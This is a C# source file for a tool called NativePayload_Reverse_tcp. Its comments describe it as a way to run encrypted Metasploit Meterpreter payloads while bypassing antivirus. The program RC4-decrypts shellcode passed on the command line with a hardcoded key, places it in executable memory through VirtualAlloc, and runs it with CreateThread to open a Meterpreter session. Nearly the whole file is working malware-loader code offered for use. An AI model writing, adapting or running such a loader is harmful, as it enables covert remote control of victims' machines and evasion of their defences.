using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("NativePayload_Reverse_tcp")]
[assembly: AssemblyDescription("Publisher and Author: Damon Mohammadbagher")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("NativePayload_Reverse_tcp")]
[assembly: AssemblyCopyright("Copyright ©  2016")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("78f4fc20-474e-4cae-80ac-9364390fa9dd")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace NativePayload_Reverse_tcp
{
    class Program
    {
        /// <summary>
        /// You can use Meterpreter Encrypted Payloads with this C# Source code
        /// Publisher and Author: Damon mohammadbagher
        /// Email :  Damonmohammadbagher@gmail.com
        /// Step 1 : you should Encrypt your Msfvenom Payload with EncryptMaker tool 
        /// Step 2 : you can hardcode your encrypted Payload in this code by value "Payload_Encrypted"
        /// or you can use command prompt argument for importing Encrypted Payload to this code (Safe)
        /// for more information visit this link 
        /// link : https://www.linkedin.com/pulse/bypass-all-anti-viruses-encrypted-payloads-c-damon-mohammadbagher
        /// 
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            string Payload_Encrypted;
            if (args != null) { Payload_Encrypted = args[0].ToString(); }
            else{ Payload_Encrypted = "88,136,167";}
            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
            byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);
            Console.WriteLine("Bingo Meterpreter session ;)");
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            /// execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
           
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        
        ///private static UInt32 PAGE_EXECUTE_READWRITE = 0x80;

        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }
        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                Swap(s, i, j);
            }

            return s;
        }
        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);

            int i = 0;
            int j = 0;

            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                Swap(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }      

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
        
    }
}
